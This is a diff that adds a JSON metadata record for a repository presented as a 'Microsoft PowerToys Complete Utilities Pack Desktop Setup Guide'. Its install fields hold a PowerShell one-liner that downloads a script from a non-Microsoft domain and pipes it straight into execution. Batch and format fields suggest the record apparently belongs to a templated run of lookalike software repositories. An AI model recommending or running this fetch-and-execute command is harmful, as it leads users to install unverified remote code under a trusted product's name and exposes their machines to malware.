@@ -1,0 +1,25 @@
+{
+  "repo": "Microsoft-PowerToys-Complete-Utilities-Pack-Desktop-Setup-Guide",
+  "product": "Microsoft PowerToys Complete Utilities Pack Desktop Setup Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "utility",
+  "topics": [
+    "microsoft-powertoys-complete-utilities-p",
+    "microsoft",
+    "powertoys",
+    "complete",
+    "utilities",
+    "pack",
+    "desktop",
+    "utility",
+    "windows",
+    "setup-guide",
+    "software",
+    "productivity"
+  ]
+}
